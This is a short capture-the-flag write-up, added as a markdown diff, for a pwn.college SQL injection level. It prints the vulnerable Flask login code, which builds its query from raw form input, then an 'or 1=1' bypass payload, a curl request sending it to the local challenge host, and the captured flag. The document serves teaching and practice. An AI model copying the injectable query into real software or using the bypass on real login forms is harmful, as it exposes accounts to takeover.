@@ -1,0 +1,43 @@
+# Level 4
+
+As usual we are given with a task to `Exploit a structured query language injection vulnerability to login`
+
+we got the machine and souce code for the challenge
+
+```python copy {13} /{username}/ /{password}/
+
+def level4():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        session["user"] = int(user["rowid"])
+        return redirect(request.path)
+
+```
+
+we can see that the user input is not sanitized and we can use sql injection to get the flag
+
+```sql
+username" or 1=1 -- -"
+```
+
+Example request
+
+```bash
+curl -X POST http://challenge.localhost:80/ -d 'username=" or 1=1 -- -&password=spear'
+```
+
+This will redirect us to the home page containing flag 🚩
+```text copy
+pwn.college{oMQUW6gEdPev9OrMTrFZcDKmIfZ.dBTOzMDL0IzMyMzW}
+```
